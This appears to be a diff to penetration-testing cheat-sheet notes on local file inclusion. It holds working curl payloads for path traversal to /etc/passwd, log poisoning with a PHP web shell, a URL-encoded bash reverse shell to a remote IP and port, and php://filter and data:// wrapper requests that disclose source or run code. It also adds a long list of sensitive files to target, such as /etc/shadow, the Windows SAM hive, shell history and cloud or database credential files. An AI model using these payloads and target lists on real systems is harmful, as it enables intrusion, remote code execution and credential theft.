@@ -37,7 +37,9 @@ curl --path-as-is "http://<url>/index.php?page=../../../etc/passwd"
 ### Local
 
 ```shell
-# gind or poison a file that execute commands with <?php echo system($_GET['cmd']); ?> for example.
+curl http://<ip>/../../../../../../../../../etc/passwd
+
+# poison a file that execute commands with <?php echo system($_GET['cmd']); ?> for example.
 # perform the path traversal and add the command
 curl http://192.168.123.193/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
 
@@ -48,6 +50,60 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.230%2F4444%200%3E%
 curl http://192.168.123.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
 curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
 ```
+
+#### Interesting files
+
+**Linux Systems**
+
+- `/etc/passwd`
+- `/etc/shadow`
+- `/etc/hosts`
+- `/etc/issue`
+- `/proc/version`
+- `/proc/cmdline`
+- `/proc/self/environ`
+- `/var/log/*`
+- `/var/log/auth.log`
+- `/var/log/secure`
+- `/var/log/syslog`
+- `/var/log/messages`
+- `/var/log/apache2/access.log`
+- `/var/log/nginx/access.log`
+- `/home/[user]/.bash_history`
+- `/var/www/html/`
+- `/opt/lampp/htdocs/`
+- `/etc/apache2/sites-available/*`
+- `/etc/nginx/sites-available/*`
+- `/etc/redis/redis.conf`
+- `/usr/local/etc/redis/redis.conf`
+- `/etc/mysql/my.cnf`
+- `/etc/my.cnf`
+- `/etc/postgresql/[version]/main/postgresql.conf`
+- `/etc/postgresql/[version]/main/pg_hba.conf`
+- `/etc/ssh/sshd_config`
+- `/etc/ssh/ssh_config`
+- `/etc/docker/daemon.json`
+- `/var/run/docker.sock`
+- `/etc/php/[version]/cli/php.ini`
+- `/etc/php/[version]/apache2/php.ini`
+- `/etc/mongod.conf`
+
+**Windows Systems**
+
+- `C:\Windows\System32\drivers\etc\hosts`
+- `C:\boot.ini`
+- `C:\Windows\win.ini`
+- `C:\Windows\System32\config\SAM`
+- `C:\inetpub\wwwroot\`
+- `C:\Windows\php.ini`
+- `C:\inetpub\wwwroot\web.config`
+
+**General Application Files (Platform Independent):**
+
+- `wp-config.php` (WordPress) - *check web root*
+- `.git/config` - *check web root or user directories*
+- `~/.kube/config` - *user home directory*
+- `~/.my.cnf` - *user home directory*
 
 ### Remote
 
